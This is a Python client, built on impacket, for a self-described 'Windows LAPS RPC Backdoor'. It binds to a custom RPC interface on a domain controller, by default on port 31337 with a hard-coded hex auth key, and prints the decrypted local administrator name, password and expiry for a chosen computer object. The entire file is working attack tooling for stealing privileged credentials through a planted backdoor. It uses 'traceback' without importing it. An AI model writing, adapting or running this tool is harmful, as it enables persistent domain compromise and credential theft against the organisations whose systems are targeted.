#!/usr/bin/env python3

import json
from datetime import datetime
from argparse import ArgumentParser

from impacket import system_errors
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRUniConformantArray
from impacket.dcerpc.v5.dtypes import WSTR, LPWSTR
from impacket.dcerpc.v5.rpcrt import DCERPCException

ERROR_MESSAGES = {
    0xffffffff: ('ERROR_LDAP_CONNECTION_FAILED', 'Failed to initialize LDAP connection'),
    0xfffffffe: ('ERROR_LDAP_BIND_FAILED', 'LDAP bind failed'),
    0xfffffffd: ('ERROR_LDAP_SEARCH_FAILED', 'LDAP search failed'),
    0xfffffffc: ('ERROR_LDAP_NO_SUCH_OBJECT', 'Could not find computer object'),
    0xfffffffb: ('ERROR_LAPS_DECRYPTION_FAILED', 'Decryption failed'),
    0xfffffffa: ('ERROR_NO_PASSWORD_DECRYPTED', 'Decrypted password not found')
}
ERROR_MESSAGES |= system_errors.ERROR_MESSAGES


class BYTE_ARRAY(NDRUniConformantArray):
    item = 'c'


class DecryptPassword(NDRCALL):
    opnum = 0
    structure = (
        ('dn', WSTR),
        ('authKey', BYTE_ARRAY),
        ('authKeyLen', '<L'),
    )


class DecryptPasswordResponse(NDRCALL):
    structure = (
        ('result', LPWSTR),
    )


class DCERPCSessionError(DCERPCException):

    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in ERROR_MESSAGES:
            error_msg_short = ERROR_MESSAGES[key][0]
            error_msg_verbose = ERROR_MESSAGES[key][1]
            return f'SessionError: code: 0x{self.error_code:02x} - {error_msg_short} - {error_msg_verbose}'
        else:
            return f'SessionError: unknown error code: 0x{self.error_code:02x}'


def djb2(s):
    h = 3851
    for x in s:
        h = ((h << 5) + h) + x
    return h & 0xFFFFFFFF


def nt_to_unix_timestamp(timestamp):
    return datetime.fromtimestamp((timestamp / 10000000) - 11644473600).strftime('%Y/%m/%d %H:%M:%S')


def main(dc, port, args):
    string_binding = f'ncacn_ip_tcp:{dc}[{port}]'
    rpc_transport = transport.DCERPCTransportFactory(string_binding)
    dce = rpc_transport.get_dce_rpc()
    dce.connect()

    interface_uuid = uuidtup_to_bin(('12345678-1234-1234-1234-1234567890ab', '1.0'))
    dce.bind(interface_uuid)

    request = DecryptPassword()
    request['dn'] = f'{args.dn}\x00'
    request['authKey'] = args.key
    request['authKeyLen'] = len(args.key)

    try:
        resp = dce.request(request)
    except DCERPCSessionError as e:
        raise
    else:
        try:
            timestamp, password = resp['result'].split('|', 1)
            timestamp = int(timestamp)
            password = json.loads(password.strip('\x00'))
        except:
            print(resp['result'])
            traceback.print_exc()
        else:
            print(f'Account             : {password["n"]}')
            print(f'Password            : {password["p"]}')
            print(f'ExpirationTimestamp : {nt_to_unix_timestamp(timestamp)}')
    finally:
        dce.disconnect()


if __name__ == '__main__':
    parser = ArgumentParser(description='Windows LAPS RPC Backdoor')
    parser.add_argument('dn', help='DN of the computer object to request password for')
    parser.add_argument('target', metavar='DC:PORT', help='DC name or IP address and interface port')
    parser.add_argument('-key', type=bytes.fromhex, default='0123456789abcdef', help='auth key as a hex string')
    args = parser.parse_args()

    try:
        dc, port = args.target.split(':')
    except ValueError:
        dc = args.target
        port = 31337

    main(dc, port, args)
